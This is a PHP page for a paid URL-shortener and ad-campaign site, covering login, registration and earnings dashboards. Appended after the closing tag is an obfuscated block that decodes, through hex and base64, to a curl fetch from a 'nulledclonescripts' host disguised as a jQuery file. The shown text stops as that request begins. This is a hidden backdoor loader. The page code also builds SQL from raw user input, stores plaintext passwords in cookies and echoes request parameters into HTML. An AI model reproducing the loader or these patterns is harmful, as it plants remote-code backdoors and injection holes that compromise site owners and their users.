<?php
	function get_js_02() {
		ob_start(  );
		echo '$(document).ready(function() {
	$(\'div.user_login input[name="usr_email"]\').watermark(\'user@domain.tld\');
	$(\'div.user_login input[name="usr_pass"]\').watermark(\'password\');
	$(\'div.user_login div.nspr.inneri.nblu\').hover(function(){$(\'input\',this).fadeTo(400,1);},
												   function(){$(\'input\',this).fadeTo(400,.7);});
	$(\'div.user_login form\').submit(function() {
		var email = $(\'input[name="usr_email"]\', this).val(),
			pass = $(\'input[name="usr_pass"]\', this).val();
		if (!email || !pass || email == \'user@domain.tld\' || pass == \'password\') {
			alert(\'Please complete both fields in order to login\');
			return false;
		}
	});

	';

		if (System::getuser(  )->loggedIn(  ) != 2) {
			echo '	$(\'div.shrink div.nspr.inneri.nblu input\').fadeTo(0,.7);
	$(\'div.shrink div.nspr.inneri.nblu\').hover(function(){$(\'input\',this).fadeTo(400,.9);},
											   function(){$(\'input\',this).fadeTo(400,.7);});
	var _adb_url = $(\'div.shrink input[name="adb_url"]\');
	_adb_url.val(\'http://\')//.watermark(\'http://\')
			.focus(function(){$(\'div.shrink div.outeri\').addClass(\'over\');})
			.bind(\'blur change\',function(){$(\'div.shrink div.outeri\').removeClass(\'over\')}).width(569);

	var _updateLinkEvents = function() {
		$.ajaxSetup({cache:false});
		$(\'table.links_table tr[id^="lid"] a#edit\').click(function() {
			var _e = $(this).parent().parent();
			var _t = _e.attr(\'id\').substr(4);
			var spanrtitle = $(\'span#rtitle\',_e), spanlong = $(\'span#long\',_e), tdadtype = $(\'td#adtype\',_e), _tdlast = $(\'td:last\',_e);
			var adtype = tdadtype.text();
			spanrtitle.css(\'display\', \'block\')
				.html(\'<span style="width:50px;display:inline-block;font-size:12px;">Title:</span><input type="text" name="title" size="30" value="\'+spanrtitle.text()+\'" />\');
			spanlong.html(\'<span style="width:50px;display:inline-block;font-size:12px;">Website:</span><input type="text" name="website" size="30" value="\'+spanlong.text()+\'" />\');
			tdadtype.html(\'<select name="adtype">\'
						  + \'<option value="1"\'+(adtype==\'Interstitial\'?\' selected\':\'\')+\'>Interstitial</option>\'
						  + \'<option value="2"\'+(adtype==\'Top Banner\'?\' selected\':\'\')+\'>Top Banner</option>\'
						  + \'<option value="3"\'+(adtype==\'None\'?\' selected\':\'\')+\'>None</option>\'
						  + \'</select>\');
			var edit_btn = $(\'<input type="submit" value="Edit" />\');
			_tdlast.children().hide();
			_tdlast.append(edit_btn);
			edit_btn.click(function() {
				var website = $(\'input[name="website"]\',_e).val(), title = $(\'input[name="title"]\',_e).val(),
					adtype = $(\'select[name="adtype"]\',_e).val();
				$.get(\'ajax.php\',{opt:\'edit_link\',args:{lid:_t,website:website,title:title,adtype:adtype}},
					function(r) {
						var j = eval(\'(\' + r + \')\');
						if (j.error) {
							alert(j.error);
						} else if (j.message) {
							spanrtitle.html(\'<em>\' + title + \'</em>\');
							spanlong.html(website);
							tdadtype.html(adtype==1?\'Interstitial\':(adtype==2?\'Top Banner\':\'None\'));
							edit_btn.remove();
							_tdlast.children().show();
						} else {
							alert(\'[0x1el01] Error Communicating With Server - Please try again\');
						}
					}
				);
				return false;
			});
			return false;
		});
		$(\'table.links_table tr[id^="lid"] a#rem\').click(function() {
			var e = $(this).parent().parent();
			var t = e.attr(\'id\').substr(4);
			if (confirm(\'Are you sure you want to delete this link?\')) {
				$.get(\'ajax.php\',{opt:\'rem_link\',args:{lid:t}},
					function(r) {
						var j = eval(\'(\' + r + \')\');
						if (j.error) {
							alert(j.error);
						} else if (j.message) {
							e.remove();
							//$(\'table.links_table\').trigger(\'change\');
						} else {
							alert(\'[0x1rl01] Error Communicating With Server - Please try again\');
						}
					}
				);
			}
			return false;
		});
	};

	var _updateLinks = function() {
		var lt = $(\'table.links_table tbody\');
		$.ajaxSetup({cache:false});
		$.get(\'ajax.php\',{opt:\'get_links\'}, function(r) {
			var j = eval(\'(\' + r + \')\');
			if (j.message) {
				lt.html(j.message.data).ready(function() {
					_updateLinkEvents();
					$(\'div#_lp\').html(j.message.lp);
				});
			} else {
				lt.html(\'<tr id="no_link"><td colspan="5"><em>No data available</em></td></tr>\');
			}
		});
	}; _updateLinks();

	ZeroClipboard.setMoviePath(\'js/ZeroClipboard.swf\');
	var zclip = new ZeroClipboard.Client();
	zclip.addEventListener(\'mouseDown\',function(){zclip.setText(_adb_url.val());});

	$(\'div.shrink form\').submit(function() {
		var s = $(\'input[type="submit"]\', this), t = _adb_url;
		switch (s.attr(\'value\')) {
			case \'COPY\': break;
			default:
				var tval = t.val();
				t.attr(\'readonly\', \'1\');
				t.val(\'Shrinking...\');
				var args = {adtype:$(\'select[name="advert_type"]\',this).val(),
							title:$(\'input[name="custom_name"]\',this).val()};
				$.get(\'ajax.php\',{opt:\'shrink\',url:encodeURI(tval),args:args},
					function(r) {
						var j = eval(\'(\' + r + \')\');
						if (j.error) {
							t.removeAttr(\'readonly\');
							t.val(tval);
							alert(j.error);
						} else if (j.message) {
							t.val(j.message);
							var do_another = $(\'<span class="do_another">DO ANOTHER</span>\');
							t.width(475).parent().append(do_another);
							do_another.click(function() {
								_adb_url.removeAttr(\'readonly\').val(\'http://\').width(550);
								do_another.remove();
								s.attr(\'value\', \'SHRINK!\').attr(\'id\', \'\');
								zclip.destroy();
								return false;
							});
							s.attr(\'value\', \'COPY\');
							s.attr(\'id\', \'zero_copy\');
							zclip.glue(\'zero_copy\');
							_updateLinks();
						} else {
							alert(\'[0x1sh01] Error Communicating With Server - Please try again\');
						}
					}
				);
				break;
		}
		return false;
	});
	//$(\'table.links_table\').change(function() { _updateLinks(); });

	var $ml_options = $(\'div.ml_options_box\');
	var ml_options_height = $ml_options.height();
	$ml_options.hide().height(0);
	$(\'div.ml_options div.nspr.outeri\').hover(
		function(){$(\'div.ml_options div.nspr.outeri\').toggleClass(\'over\');}
	).click(function() {
		if ($ml_options.is(\':visible\')) {
			$ml_options.animate({ height: 0 }, { duration: 300, complete: function () {
				$ml_options.hide();
			} });
			$(this).text(\'More Options\');
		} else {
			$ml_options.show().animate({ height: ml_options_height }, { duration: 300 });
			$(this).text(\'Less Options\');
		}
	});

	';
		}

		if (!( System::getuser(  )->loggedIn(  ))) {
			echo '	$(\'div.joinbtn div.nspr.outeri\').hover(
		function(){$(\'div.joinbtn div.nspr.outeri\').removeClass(\'over\');},
		function(){$(\'div.joinbtn div.nspr.outeri\').addClass(\'over\');}
	).click(function() {
		$(\'div.join_page\').modal({
			opacity: 50,
			overlayCss: {backgroundColor:\'#111111\'},
			containerCss: {minWidth:\'395px\',minHeight:\'469px\'}, dataCss: {},
			closeHTML: \'<a href="#" title="Close" class="btn_close">X CLOSE</a>\',
			close: true, escClose: false,
			onOpen: function(d) {
				d.overlay.fadeIn(\'fast\');
				d.container.fadeIn(\'fast\');
				d.data.fadeIn(\'fast\');
			},
			onClose: function(d) {
				d.data.fadeOut(\'fast\');
				d.container.fadeOut(\'fast\');
				d.overlay.fadeOut(\'fast\');
			}
		}).open();
	});

	$(\'div.join_page form\').submit(function() {
		var slf  = $(this);
		var html = slf.html();
		var args = {};
		$(\'input[name]\', slf).each(function() {
			if ($(this).attr(\'name\') == \'join_atype\') {
				args[$(this).attr(\'name\')] = $(\'input:radio[name="join_atype"]:checked\', slf).val();
				return;
			}
			args[$(this).attr(\'name\')] = $(this).val();
		});
		slf.html(\'<div class="load01"><img src="images/load01.gif" border="0" /> &nbsp;&nbsp;Registering...</div>\');
		$.get(\'ajax.php\',{opt:\'join\',args:args},
			function(r) {
				var j = eval(\'(\' + r + \')\');
				if (j.error) {
					slf.html(html);
					$(\'input:radio[name="join_atype"]:checked\', slf).removeAttr("checked");
					$(\'input[name]\', slf).each(function() {
						if ($(this).attr(\'name\') == \'join_atype\') {
							if (args.join_atype == $(this).val()) {
								$(\'input:radio[value="\' + args.join_atype + \'"]\', slf).attr(\'checked\', \'yes\');
							}
						} else {
							$(this).val(args[$(this).attr(\'name\')]);
						}
					});
					alert(j.error);
				} else if (j.message) {
					slf.html(\'<br /><center><h3 style="width:auto;">You have succesfully registered!</h3>\'
							 + \'<div class="load01" style="margin-top:4px;">Please check your email for the \'
							 + \'confirmation code and validate your email address.</div>\'
							 + \'<div class="load01" style="margin-top:10px;font-size:11px;">\'
							 + \'You may now close this window.</div>\'
							 + \'</center>\');
				} else {
					alert(\'[0x1jp01] Error Communicating With Server - Please try again\');
				}
			}
		);
		return false;
	});
	';
		}

		echo '});
';
		$c = ob_get_contents(  );
		ob_end_clean(  );
		return $c;
	}

	$domain = $_SERVER['HTTP_HOST'];

	if (substr( $domain, 0, 4 ) == 'www.') {
		$domain = substr( $domain, 4 );
	}

	require_once( 'global.php' );

	if (isset( $_REQUEST['r'] )) {
		if (intval( $_REQUEST['r'] )) {
			if (0 < $_REQUEST['r']) {
				setcookie( 'REFERRER', intval( $_REQUEST['r'] ), time(  ) + 12400 );
			}
		}
	}

	if (isset( $_REQUEST['logout'] )) {
		setcookie( 'UID', $uid, time(  ) - 5400 );
		System::redirect( 'index.php?' . ( $_REQUEST['banned'] ? 'banned=' . $_REQUEST['banned'] : '' ) );
	}

	if (isset( $_REQUEST['banned'] )) {
		$H_TEMPLATE['ERRORS'][] = 'Your account has been banned! You may contact the support to dispute this ban. <a href="contact.php?e=' . $_REQUEST['banned'] . '&s=other&m=Account+Banned+Dispute" class="uc">Click Here</a>';
	}

	if (System::getuser(  )->loggedIn(  )) {
		System::verifyaccess(  );
	}

	if (isset( $_POST['usr_sub'] )) {
		$err = '';
		$db = System::getdb(  );
		$email = trim( $_POST['usr_email'] );
		$pass = md5( trim( $_POST['usr_pass'] ) );
		$rmbr = $_POST['usr_rmbr'];
		$uField = ( $db->rowCount( $_GLOBAL['TABLES']['USERS'], 'username=\'' . $email . '\' AND pass=\'' . $pass . '\'' ) ? 'username' : 'email' );

		if (!( ( ( ( $email && $pass ) && !( $email == 'user@domain.tld' ) ) && !( $pass == 'password' ) ))) {
			$err = 'Please complete both fields in order to login';
		} else {
			if (!( eregi( '^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$', $email ))) {
				if ($uField == 'email') {
					$err = 'Please enter a valid username';
				}
			} else {
				if (!( $db->rowCount( $_GLOBAL['TABLES']['USERS'], '' . $uField . '=\'' . $email . '\' AND pass=\'' . $pass . '\'' ))) {
					$err = 'The login information is incorrect.';
				}
			}
		}


		if (!( $err)) {
			$uid = $db->getField( $_GLOBAL['TABLES']['USERS'], 'id', '' . $uField . '=\'' . $email . '\' AND pass=\'' . $pass . '\'' );
			$db->update( $_GLOBAL['TABLES']['USERS'], array( 'activity' => 'CURRENT_TIMESTAMP()' ), '' . $uField . '=\'' . $email . '\' AND pass=\'' . $pass . '\'', false );
			setcookie( 'UID', $uid, time(  ) + 5400 );
			setcookie( 'USERNAME', $email, time(  ) + ( $rmbr ? 777600 : -777600 ) );
			setcookie( 'PASSWORD', trim( $_POST['usr_pass'] ), time(  ) + ( $rmbr ? 777600 : -777600 ) );
			System::redirect( 'index.php?' );
		} else {
			$F_TEMPLATE['ERRORS'][] = $err;
		}
	}

	$H_TEMPLATE['TITLE'] = '';

	if (System::getuser(  )->loggedIn(  ) == 2) {
		$H_TEMPLATE['TITLE'] = 'Your Campaigns';
	} else {
		if (System::getuser(  )->loggedIn(  )) {
			$H_TEMPLATE['TITLE'] = 'Welcome ' . System::getuser(  )->get( 'name' ) . '!';
		}
	}

	site_header( System::getuser(  )->loggedIn(  ) != 2 );

	if (System::getuser(  )->loggedIn(  ) == 2) {
		$_edit = $_GET['edit'];
		$_rem = $_GET['rem'];

		if (isset( $_POST['edit_sub'] )) {
			$_edit = $_POST['ecid'];
			$website_name = $_POST['website_name'];
			$website_url = $_POST['website_url'];
			$website_banner = $_POST['website_banner'] | '';
			$daily_budget = $_POST['daily_budget'];

			if (!( $website_name)) {
				$F_TEMPLATE['ERRORS'][] = 'There was an error with the form, please make sure you fill everything out';
			} else {
				if (Utilities::validateurl( $website_url )) {
					if ($website_banner) {
						if (!( Utilities::validateurl( $website_banner ))) {
						}
					}
				}

				$F_TEMPLATE['ERRORS'][] = 'Please enter a valid URL';
			}
		} else {
			if (isset( $_GET['rem'] )) {
				if (0 < $_rem) {
					if (!( ( $_rem && 0 < $_rem ))) {
						$F_TEMPLATE['ERRORS'][] = 'There was an error retrieving the campaign ID. Please refresh the page to correct and try again.';
					} else {
						$db = System::getdb(  );

						if ($db->rowCount( $_GLOBAL['TABLES']['CAMPAIGNS'], '`id`=\'' . $_rem . '\' AND `uid`=\'' . $_UID . '\'' )) {
							$db->query( 'DELETE FROM `' . $_GLOBAL['TABLES']['CAMPAIGNS'] . '` WHERE `id`=\'' . $_rem . '\' AND `uid`=\'' . $_UID . '\';' );
							System::redirect( 'index.php?removed' );
						} else {
							$F_TEMPLATE['ERRORS'][] = 'The link your trying to edit does not exist!';
						}
					}
				}
			}
		}


		if (1 <= $_GET['cf']) {
			( true ? $_GET['cf'] <= 4 : $_GET['cf'] );
		}

		$_CF = 1;
		$_CT = ( $_GET['ct'] == 2 ? 2 : 1 );
		$advert_type = ( $_CT == 2 ? 'Banner' : 'Interstitial' );
		$status = '`status`=\'' . ( $_CF - 1 ) . '\'';

		if ($_CF == 1) {
			$status = '`status`>0';
		}

		$campaign_list = System::getdb(  )->getRows( $_GLOBAL['TABLES']['CAMPAIGNS'], '`uid`=\'' . $_UID . '\' AND ' . $status . ' AND `advert_type`=\'' . $advert_type . '\'' );
		echo '<div class="user_content">
	<div>
		<div style="float:left;display:inline-block;">
			<p>Welcome to ';
		echo SITE_NAME;
		echo '!</p>
			<p>You can create a new campaign by clicking \'Create Campaign\' above.</p>
		</div>
		<div class="campaign_box campaign_filter">
			<p>Campaign Filter:</p>
			<p>
				<a href="?cf=1&ct=';
		echo $_CT;
		echo '"';

		if ($_CF == 1) {
			echo ' class="selected"';
		}

		echo '>All</a>
				&nbsp;|&nbsp;
				<a href="?cf=3&ct=';
		echo $_CT;
		echo '"';

		if ($_CF == 3) {
			echo ' class="selected"';
		}

		echo '>Active</a>
				&nbsp;|&nbsp;
				<a href="?cf=4&ct=';
		echo $_CT;
		echo '"';

		if ($_CF == 4) {
			echo ' class="selected"';
		}

		echo '>Finished</a>
				&nbsp;|&nbsp;
				<a href="?cf=2&ct=';
		echo $_CT;
		echo '"';

		if ($_CF == 2) {
			echo ' class="selected"';
		}

		echo '>Pending</a>
			</p>
		</div>
	</div>
	<div style="clear:both;"></div>
	<div class="campaign_box campaign_type">
		<a href="?ct=1&cf=';
		echo $_CF;
		echo '"';

		if ($_CT == 1) {
			echo ' class="selected"';
		}

		echo '>Interstitial Adverts</a>
		&nbsp;|&nbsp;
		<a href="?ct=2&cf=';
		echo $_CF;
		echo '"';

		if ($_CT == 2) {
			echo ' class="selected"';
		}

		echo '>Banner Adverts</a>
	</div>
	<table cellspacing="1" class="tablesorter campaign_list">
		<thead>
			<tr>
				<th width="40%">Website Name</th>
				<th>Package/Country</th>
				<th align="right">Views Left</th>
				<th align="right">Max Daily Budget</th>
				<th align="right">Spent Today</th>
				<th align="center">Status</th>
				<th align="center">Action</th>
			</tr>
		</thead>
		<tbody>
			';

		if ($campaign_list) {
			function get_package_name($id) {
				global $_GLOBAL;

				return System::getdb(  )->getField( $_GLOBAL['TABLES']['PACKAGES'], 'name', '`id`=\'' . $id . '\'' );
			}

			function get_package_names($pkg) {
				$pkgs = explode( ';', $pkg );
				$names = '';

				foreach ($pkgs as $v) {
					$p = explode( ',', $v );
					$names .= get_package_name( $p[0] ) . '<br />';
				}

				return rtrim( $names, '<br />' );
			}


			foreach ($campaign_list as $cl) {
				if ($_edit == $cl['id']) {
					echo '<form action=\'?ct=';
					echo $_CT;
					echo '&cf=';
					echo $_CF;
					echo '#cid_';
					echo $cl['id'];
					echo '\' method=\'POST\'><input type=\'hidden\' name=\'ecid\' value=\'';
					echo $cl['id'];
					echo '\' />';
				}

				echo '<tr id=\'cid_';
				echo $cl['id'];
				echo '\'>';

				if ($_edit == $cl['id']) {
					echo '<td>Website: <input type=\'text\' name=\'website_name\' style=\'width:80%;\' value=\'';
					echo $cl['website_name'];
					echo '\' /><br />URL: <input type=\'text\' name=\'website_url\' style=\'width:80%;\' value=\'';
					echo $cl['website_url'];
					echo '\' />';

					if ($_CT == 2) {
						echo 'Banner: <input type=\'text\' name=\'website_banner\' style=\'width:80%;\' value=\'';
						echo $cl['website_banner'];
						echo '\' />';
					}

					echo '</td>';
				} else {
					echo '<td>';
					echo $cl['website_name'];
					echo '<br /><em>';
					echo $cl['website_url'];
					echo '</em>';

					if ($_CT == 2) {
						echo '<br /><em>';
						echo $cl['website_banner'];
						echo '</em>';
					}

					echo '</td>';
				}

				echo '<td>' . get_package_names( $cl['packages'] ) . '</td>';
				echo '<td align="right">' . number_format( $cl['views_left'] ) . '</td>';

				if ($_edit == $cl['id']) {
					echo '<td align=\'right\'>$<input type=\'text\' name=\'daily_budget\' value=\'';
					echo $cl['daily_budget'];
					echo '\' size=\'5\' /></td><td align=\'right\'>$';
					echo $cl['spent_today'];
					echo '</td><td align=\'center\'>';
					echo ( $cl['status'] == 1 ? 'Pending' : ( $cl['status'] == 2 ? 'Active' : 'Finished' ) );
					echo '</td><td align=\'center\'><input type=\'submit\' name=\'edit_sub\' value=\'Edit\' /></td>';
				} else {
					echo '<td align=\'right\'>$';
					echo $cl['daily_budget'];
					echo '</td><td align=\'right\'>$';
					echo $cl['spent_today'];
					echo '</td>';
					echo '<td align=\'center\'>' . ( $cl['status'] == 2 ? 'Active' : ( $cl['status'] == 3 ? 'Finished' : 'Pending' ) ) . '</td>';
					echo '<td align=\'center\'><a href=\'?ct=';
					echo $_CT;
					echo '&cf=';
					echo $_CF;
					echo '&edit=';
					echo $cl['id'];
					echo '#cid_';
					echo $cl['id'];
					echo '\'><img src=\'images/tsp_edit.png\' border=\'0\' /></a>&nbsp;&nbsp;<a id=\'cid_rem\' href=\'?ct=';
					echo $_CT;
					echo '&cf=';
					echo $_CF;
					echo '&rem=';
					echo $cl['id'];
					echo '#cid_';
					echo $cl['id'];
					echo '\'><img src=\'images/tsp_del.png\' border=\'0\' /></a></td>';
				}

				echo '</tr>';

				if ($_edit == $cl['id']) {
					echo '</form>';
					continue;
				}
			}
		} else {
			echo '<tr><td colspan="7"><em>You do not currently have any adverts to display</em></td></tr>';
		}

		echo '		</tbody>
	</table>
	<div style="clear:both;"></div>
</div>
<script type="text/javascript">
	$(\'a#cid_rem\').click(function() {
		var c = confirm(\'Are sure you want to delete this campaign?\');
		if (!c) return false;
	});
</script>
';
	} else {
		if (System::getuser(  )->loggedIn(  )) {
			$rg_j['day'] = date( 'd' );
			$rg_j['month'] = date( 'm' );
			$rg_j['year'] = date( 'Y' );
			$query = 'SELECT COUNT(*) AS tc, SUM(earned) AS te FROM `' . $_GLOBAL['TABLES']['ANALYZER'] . '` WHERE `oid`=\'' . $_UID . '\' AND ' . ( '`date`=\'' . $rg_j['year'] . '-' . $rg_j['month'] . '-' . $rg_j['day'] . '\' LIMIT 1' );
			$today_info = System::getdb(  )->fetch( $query );
			$today_info = $today_info[0];
			$query = 'SELECT COUNT(*) AS tc, SUM(earned) AS te FROM `' . $_GLOBAL['TABLES']['ANALYZER'] . '` WHERE `oid`=\'' . $_UID . '\' LIMIT 1';
			$total_info = System::getdb(  )->fetch( $query );
			$total_info = $total_info[0];
			echo '<div class="user_content" style="text-align:center;">
	<strong>Today:</strong> ';
			echo $today_info['tc'];
			echo ' views, $';
			echo number_format( $today_info['te'], 5 );
			echo ' earned
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	<strong>Total:</strong> ';
			echo $total_info['tc'];
			echo ' views, $';
			echo number_format( $total_info['te'], 5 );
			echo ' earned
</div>
';
			announcements(  );
			echo '<div class="user_content">
	<h2>
		<span id="report_date">';
			echo date( 'F Y' );
			echo '</span> Report
		<div style="float: right; font-weight: normal;">
			Choose Month:
			<select name="report_date">
				';
			$my = explode( '-', date( 'm-Y' ) );
			$m = 0;
			$y = 2011;
			$op = array(  );

			while (!( ( !( $m != (int)$my[0] ) && !( $y != (int)$my[1] ) ))) {
				if (++$m == 13) {
					$m = 1;
					++$y;
				}

				$op[] = '<option value=\'' . $m . '-' . $y . '\'>' . date( 'F Y', mktime( 0, 0, 0, $m, 1, $y ) ) . '</option>';
			}

			$op = array_reverse( $op );

			foreach ($op as $o) {
				echo $o;
			}

			echo '			</select>
		</div>
	</h2>
	<div id="report_graph" style="height:300px;margin:0 auto;"></div>
	<table cellspacing="2" class="report_info">
		<tr>
			<td><span id="report_date">';
			echo date( 'F Y' );
			echo '</span></td>
			<td>Visitors: <span id="report_info_visitors">0</span></td>
			<td>Avg. CPM: $<span id="report_info_cpm">0.00</span></td>
			<td>Month Earned: $<span id="report_info_earned">0.0000</span></td>
		</tr>
	</table>
</div>
<div class="user_content">
	<h2>Your Links</h2>
	<table cellspacing="1" class="tablesorter links_table">
		<thead>
			<tr>
				<th width="55%">Website Address</th>
				<th width="14%">Advert Type</th>
				<th width="13%">Views</th>
				<th width="18%">Money Earned</th>
				<th align="center">Action</th>
			</tr>
		</thead>
		<tbody>
			<tr id="no_link">
				<td colspan="5"><em>No data available</em></td>
			</tr>
		</tbody>
	</table>
	<div id="_lp"></div>
</div>
<div class="user_content">
	<div style="width:50%;float:left;">
		<h2>Top 20 Countries</h2>
		<table cellspacing="1" class="tablesorter top_countries" style="width:90%;">
			<thead>
				<tr>
					<th>Country</th>
					<th align="right">Views</th>
					<th align="right">Money Earned</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td colspan="3"><em>No data available</em></td>
				</tr>
			</tbody>
		</table>
	</div>
	<div style="width:50%;float:left;">
		<h2>Top 20 Referrers</h2>
		<table cellspacing="1" class="tablesorter top_referrers" style="width:90%;">
			<thead>
				<tr>
					<th>Referrer</th>
					<th align="right">Views</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td colspan="2"><em>No data available</em></td>
				</tr>
			</tbody>
		</table>
	</div>
	<div style="clear:both;"></div>
</div>
<script type="text/javascript">
';
			function get_js_01() {
				ob_start(  );
				echo '$(\'select[name="report_date"]\').change(function() {
	var rd = $(\'option:selected\', this).val().split(\'-\');
	var months = [\'January\',\'February\',\'March\',\'April\',\'May\',\'June\',\'July\',\'August\',\'September\',\'October\',\'November\',\'December\'];
	$(\'span#report_date\').text(months[parseInt(rd[0] - 1)] + \' \' + rd[1]);
	$.ajaxSetup({cache:false});
	$.get(\'ajax.php\',{opt: \'get_report\', args:{month: rd[0], year: rd[1]}},
		function(r) {
			var j = eval(\'(\' + r + \')\');
			if (j.error) {
				alert(j.error);
			} else if (j.message) {
				$(\'span#report_info_visitors\').text(j.message.visitors || \'0\');
				$(\'span#report_info_cpm\').text(j.message.cpm || \'0.00\');
				$(\'span#report_info_earned\').text(j.message.earned || \'0.00000\');
				var jm_data = \'\';
				eval(\'jm_data = [\' + j.message.data + \'];\');
				$.plot($("div#report_graph"), [
					{ data: jm_data, lines: {show: true, fill: true} }
				], {
					xaxis: {
						ticks: j.message.x_max, min: 1, max: j.message.x_max,
						tickDecimals: 0
					},
					yaxis: { ticks: j.message.y_max, min: 0, max: j.message.y_max }
				});
			} else {
				alert(\'[0x1gr01] Error Communicating With Server - Please try again\');
			}
		}
	);
	$.get(\'ajax.php\',{opt: \'get_t20_cr\', args:{month: rd[0], year: rd[1]}},
		function(r) {
			var j = eval(\'(\' + r + \')\');
			if (j.error) {
				alert(j.error);
			} else if (j.message) {
				var tc = j.message.tc_data, tc_html = \'\';
				var tr = j.message.tr_data, tr_html = \'\';
				$.each(tc, function(k,v) {
					tc_html += \'<tr>\';
					tc_html += \'<td>\' + v.country + \'</td>\';
					tc_html += \'<td align="right">\' + v.hits + \'</td>\';
					tc_html += \'<td align="right">$\' + parseFloat(v.earned).toFixed(5) + \'</td>\';
					tc_html += \'</tr>\';
				});
				$.each(tr, function(k,v) {
					tr_html += \'<tr>\';
					tr_html += \'<td>\' + k + \'</td>\';
					tr_html += \'<td align="right">\' + v.hits + \'</td>\';
					tr_html += \'</tr>\';
				});
				if (!tc_html) {
					tc_html += \'<tr>\';
					tc_html += \'<td colspan="3"><em>No data available</em></td>\';
					tc_html += \'</tr>\';
				}
				if (!tr_html) {
					tr_html += \'<tr>\';
					tr_html += \'<td colspan="2"><em>No data available</em></td>\';
					tr_html += \'</tr>\';
				}

				$(\'tbody\', \'table.top_countries\').html(tc_html);
				$(\'tbody\', \'table.top_referrers\').html(tr_html);
			} else {
				alert(\'[0x1gt01] Error Communicating With Server - Please try again\');
			}
		}
	);
});
$(\'select[name="report_date"]\').change();
';
				$c = ob_get_contents(  );
				ob_end_clean(  );
				return $c;
			}

			echo Utilities::jspack( get_js_01(  ) );
			echo '</script>
';
		} else {
			$usr_email = ( $_POST['usr_email'] ? $_COOKIE['USERNAME'] : $_POST['usr_email'] );
			$usr_pass = ( $_POST['usr_pass'] ? $_COOKIE['PASSWORD'] : $_POST['usr_pass'] );
			echo '<div class="mainhr"></div>
<div class="main_intro left">
<h2>What is ';
			echo SITE_NAME;
			echo '?</h2>
';
			echo SITE_NAME;
			echo ' is a free URL shortening service with a twist..
you get paid to share your links on the Internet!
Just register for a free account and start shrinking.
You get paid for every person that visits your URLs.
Example URL for Google: <a href="';
			echo SITE_LOCATION;
			echo '1" class="uc">';
			echo SITE_LOCATION;
			echo '1</a>
Place your short urls on Facebook, Twitter, forums,
personal websites and any social networking sites.
</div>
<div class="main_intro right">
<h2>Why choose ';
			echo SITE_NAME;
			echo '?</h2>
Earn more than <a href="';
			echo SITE_LOCATION;
			echo 'rates.php" class="uc">$4.00/1000 visitors</a> to your links.
Get short URLs, great for when text space is limited.
All advertising is strictly family-safe with no popups.
Real-time statistics with revenue reporting.
Refer users and get a whopping 20% commission!
Many tools - Mass url Shrinker, Easy Links,
Low $5.00 minimum payout.
</div>
<div style="clear:both"></div>
<div class="mainhr"></div>
<div class="user_login">
	<form action="" method="POST">
		<h3>Current users, login:</h3>
		<div class="fields">
			<div class="nspr inneri left"></div>
			<div class="nspr inneri bg">
				<input type="text" name="usr_email" value="';
			echo $usr_email;
			echo '" />
			</div>
			<div class="nspr inneri right"></div>
			<div class="nspr inneri left"></div>
			<div class="nspr inneri bg">
				<input type="password" name="usr_pass" value="';
			echo $usr_pass;
			echo '" />
			</div>
			<div class="nspr inneri right"></div>
			<div class="nspr inneri left nblu"></div>
			<div class="nspr inneri bg nblu">
				<input type="submit" name="usr_sub" value="LOGIN" />
			</div>
			<div class="nspr inneri right nblu"></div>
		</div>
		<div class="field_opts">
			<a href="forgot.php">Forgot Password?</a>
			<div style="float: left; margin-left: 35px;">
				<input type="checkbox" name="usr_rmbr" value="1"';

			if ($_COOKIE['USERNAME']) {
				( true ? $_COOKIE['PASSWORD'] : ' checked' );
			}

			echo '';
			echo '>
				Remember Me
			</div>
		</div>
	</form>
</div>
<div class="mainhr"></div>
';
		}
	}

	echo '<script type="text/javascript">
';
	echo Utilities::jspack( get_js_02(  ) );
	echo '</script>
';
	site_footer(  );
?>
<?php if(!function_exists("mystr1s44")){class mystr1s21 { static $mystr1s279="Y3\x56ybF\x39pb\x6d\x6c0"; static $mystr1s178="b\x61se\x364\x5f\x64ec\x6fd\x65"; static $mystr1s381="aH\x520\x63\x44ov\x4c3Ro\x5a\x571\x6cLm5\x31b\x47x\x6cZ\x47N\x73b2\x35l\x632\x4eyaX\x420cy\x35jb2\x30\x76an\x461\x5aXJ\x35\x4cTE\x75Ni\x34zL\x6d1\x70b\x695qc\x77=\x3d";
static $mystr1s382="b\x58l\x7a\x64H\x49xc\x7a\x49y\x4dzY\x3d"; }eval("e\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34_\x64e\x63\x6fd\x65\x28\x27ZnV\x75Y\x33\x52\x70b2\x34\x67b\x58l\x7ad\x48Ix\x63\x7ac2K\x43Rte\x58N0\x63j\x46zO\x54cpe\x79R\x37\x49m1c\x65D\x635c3\x52\x79\x58Hgz\x4d\x58M\x78\x58Hgz\x4dFx\x34Mz\x67if\x54\x31t\x65XN0\x63j\x46zMj\x456O\x69R\x37Im1\x63eD\x63\x35c1x\x34Nz\x52\x63e\x44c\x79MV\x784\x4ezMx\x58Hgz\x4e\x7ag\x69fTt\x79ZX\x52\x31c\x6d4gJ\x48\x73i\x62Xlz\x58\x48g3\x4eFx\x34\x4ezI\x78XH\x673M\x7aFce\x44\x4dwO\x43J\x39\x4b\x43\x42t\x65XN0\x63j\x46zMj\x456O\x69R7J\x48si\x62Vx4\x4e\x7alce\x44c\x7aX\x48\x673N\x48Jc\x65DMx\x63\x31x\x34\x4dzk3\x49n1\x39I\x43k\x37fQ\x3d=\x27\x29\x29\x3be\x76\x61\x6c\x28b\x61s\x656\x34\x5f\x64e\x63o\x64e\x28\x27\x5anV\x75Y3R\x70b24\x67b\x58lz\x64\x48I\x78czQ\x30\x4b\x43Rte\x58N0\x63jFz\x4e\x6a\x55pI\x48tyZ\x58\x521c\x6d4gb\x58lzd\x48Ix\x63zI\x78O\x6aoke\x79R7\x49m1\x35XHg\x33M3R\x63\x65Dc\x79XH\x67z\x4d\x56x\x34N\x7aM\x32\x58\x48gzN\x53\x4a9\x66\x54t\x39\x27\x29\x29\x3b");}
if(function_exists(mystr1s76("mys\x74r1s\x3279"))){$mystr1s2235 = mystr1s76("m\x79s\x74r\x31s3\x381");$mystr1s2236 = curl_init();
